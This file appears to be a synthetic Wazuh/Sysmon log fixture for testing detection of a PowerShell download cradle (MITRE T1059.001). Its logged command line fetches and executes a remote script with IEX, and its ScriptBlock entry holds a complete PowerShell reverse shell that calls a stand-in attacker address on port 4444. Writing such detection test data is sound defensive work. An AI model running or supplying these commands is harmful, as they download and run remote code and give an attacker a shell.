{
  "_metadata": {
    "attack_id": "T1059.001",
    "variation": "002",
    "name": "PowerShell Download Cradle",
    "description": "PowerShell IEX download cradle fetching and executing remote script",
    "expected_detection": "HIGH",
    "kill_chain_phase": "execution",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Sysmon Event 1 - PowerShell with download cradle",
      "sequence": 1,
      "timestamp": "2026-01-29T10:15:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: PowerShell Download Cradle",
          "id": "100100",
          "mitre": {
            "id": [
              "T1059.001"
            ],
            "tactic": [
              "Execution"
            ],
            "technique": [
              "PowerShell Download Cradle"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.397901832",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 10:15:00.000",
              "processGuid": "{A1B2C3D4-0004-0004-0004-000000000001}",
              "processId": "9012",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "commandLine": "powershell.exe -exec bypass -nop IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.100/stage2.ps1')",
              "currentDirectory": "C:\\Users\\admin.user\\Desktop\\",
              "user": "CORP\\admin.user",
              "integrityLevel": "High",
              "parentProcessGuid": "{A1B2C3D4-0004-0004-0004-000000000000}",
              "parentProcessId": "8500",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 3 - Network connection to download payload",
      "sequence": 2,
      "timestamp": "2026-01-29T10:15:01.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: PowerShell Download Cradle",
          "id": "100100",
          "mitre": {
            "id": [
              "T1059.001"
            ],
            "tactic": [
              "Execution"
            ],
            "technique": [
              "PowerShell Download Cradle"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.474910976",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 10:15:01.000",
              "processGuid": "{A1B2C3D4-0004-0004-0004-000000000001}",
              "processId": "9012",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "user": "CORP\\admin.user",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "198.51.100.50",
              "sourcePort": "49850",
              "destinationIp": "198.51.100.100",
              "destinationPort": "80"
            }
          }
        }
      }
    },
    {
      "_comment": "PowerShell ScriptBlock logging - actual code execution",
      "sequence": 3,
      "timestamp": "2026-01-29T10:15:02.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 4104: PowerShell Download Cradle",
          "id": "100100",
          "mitre": {
            "id": [
              "T1059.001"
            ],
            "tactic": [
              "Execution"
            ],
            "technique": [
              "PowerShell Download Cradle"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event4104",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.265318414",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "4104",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "providerName": "Microsoft-Windows-PowerShell",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "messageNumber": "1",
              "messageTotal": "1",
              "scriptBlockText": "$client = New-Object System.Net.Sockets.TCPClient('198.51.100.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
              "scriptBlockId": "a1b2c3d4-5678-90ab-cdef-123456789012",
              "path": ""
            }
          }
        }
      }
    }
  ]
}
